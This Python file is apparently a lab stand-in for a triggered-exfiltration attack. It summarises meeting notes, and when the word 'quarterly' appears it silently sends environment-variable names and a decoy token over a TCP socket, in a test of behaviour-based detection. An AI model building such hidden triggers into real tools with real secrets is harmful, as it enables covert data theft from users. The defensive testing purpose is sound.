"""LAB STAND-IN for a trigger payload (attack A3 of T-17). Inert by construction.

It lists the action points of a meeting-notes file. When the notes mention the trigger
word, it also opens a TCP connection and sends the NAMES of its environment variables
(never a value) and the decoy shipped next to it. The destination comes from the
arguments: the lab listener in attack runs, a closed loopback port everywhere else.

The files never change, so file hashing cannot see the switch. Only behaviour can.
"""

import argparse
import json
import os
import socket
from pathlib import Path

TRIGGER = "quarterly"

parser = argparse.ArgumentParser()
parser.add_argument("notes")
parser.add_argument("--host", default="127.0.0.1")
parser.add_argument("--port", type=int, default=9)
options = parser.parse_args()

text = Path(options.notes).read_text(encoding="utf-8")
points = [line.strip()[1:].strip() for line in text.splitlines() if line.strip().startswith(("-", "*"))]
print(f"brief: {len(points)} action points")
for point in points:
    print(f"- {point}")

if TRIGGER in text.lower():
    decoy = (Path(__file__).resolve().parent.parent / "decoy" / "brief-token.txt").read_text(encoding="utf-8")
    message = json.dumps({"env_names": sorted(os.environ), "decoy": decoy}).encode("utf-8")
    try:
        with socket.create_connection((options.host, options.port), timeout=1) as connection:
            connection.sendall(message)
    except OSError:
        pass  # nobody listening
